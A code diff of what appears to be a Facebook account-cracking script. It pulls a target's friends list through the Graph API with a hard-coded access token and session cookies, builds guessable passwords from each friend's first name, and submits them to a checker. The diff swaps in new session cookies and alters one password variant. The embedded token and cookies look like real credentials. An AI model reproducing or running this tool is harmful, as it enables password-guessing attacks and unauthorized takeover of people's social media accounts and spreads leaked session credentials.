@@ -40,7 +40,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAADYPcrzZBmcBOx7u1nAuP8W82TLY3w0L6gUhNkSeWTLtQNTBZAfioKGp7lS2wKmIlsM0qApRcxp67CzV02NqQ0gqojR5imiypDu42oVJSZAqGKCZC36SsjcOlPqlGFl8Q8T2VRUBRO6zkL4I1U4ZBSlrCnw0xCZAyNNxccUsMuMUcOmOPwMZCNt9AHnrAE0QgdZAQZDZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=cfXzZjFutg6o5alCLvc4po5a; sb=cfXzZii9ujFaY46zWaEUVCUR; m_pixel_ratio=2.75; vpd=v1%3B640x377x2.75; ps_l=1; ps_n=1; wd=377x640; c_user=100088356446509; fr=0ANMod87KWhlldn8x.AWX83h0xYc7uYHQZ70Hl_r9s8ZI.Bm8_Vx..AAA.0.0.Bm_Rfe.AWXN8Fek3Hg; xs=23%3AnNNHCV324uWlhg%3A2%3A1727862751%3A-1%3A6642; locale=ar_AR; fbl_st=101231532%3BT%3A28797712; wl_cbv=v2%3Bclient_version%3A2635%3Btimestamp%3A1727862755'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAADYPcrzZBmcBOx7u1nAuP8W82TLY3w0L6gUhNkSeWTLtQNTBZAfioKGp7lS2wKmIlsM0qApRcxp67CzV02NqQ0gqojR5imiypDu42oVJSZAqGKCZC36SsjcOlPqlGFl8Q8T2VRUBRO6zkL4I1U4ZBSlrCnw0xCZAyNNxccUsMuMUcOmOPwMZCNt9AHnrAE0QgdZAQZDZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=DUn9Zu4QQqyWOU69Luskz4Ud; sb=DUn9Zhqu3B5uRhNWYYUcCVGR; m_pixel_ratio=2.75; wd=393x766; c_user=100087162447480; fr=0EYHb58T4r0R1LzHX.AWVm_cgi1o5xOZ22-kYlXXg3vg4.Bm_UkN..AAA.0.0.Bm_UkS.AWX8AmhZKpI; xs=42%3ArGFsyQ4P8qBXTA%3A2%3A1727875347%3A-1%3A6637; m_page_voice=100087162447480'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -79,7 +79,7 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'123123',frs+'123@123']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'123123',frs+'١٢٣']
 			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
